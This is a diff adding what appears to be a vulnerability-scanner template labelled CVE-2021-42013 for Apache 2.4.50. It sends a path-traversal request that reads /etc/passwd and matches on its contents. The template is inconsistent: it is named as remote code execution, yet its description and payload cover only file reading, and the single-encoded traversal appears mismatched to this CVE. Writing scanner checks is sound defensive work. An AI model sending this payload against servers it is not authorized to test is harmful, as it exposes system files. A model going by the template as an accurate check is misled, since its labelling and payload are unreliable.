@@ -1,0 +1,30 @@
+id: cve-2021-42013-rce
+info:
+  name: Apache HTTP Server 2.4.50 Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,cve,CVE-2021-42013
+  description: |
+    Apache HTTP Server 2.4.50 is vulnerable to remote code execution due to a
+    flaw in path traversal handling. Exploitation allows attackers to access
+    files outside the document root directory.
+http:
+  - raw:
+      - |
+        GET /icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
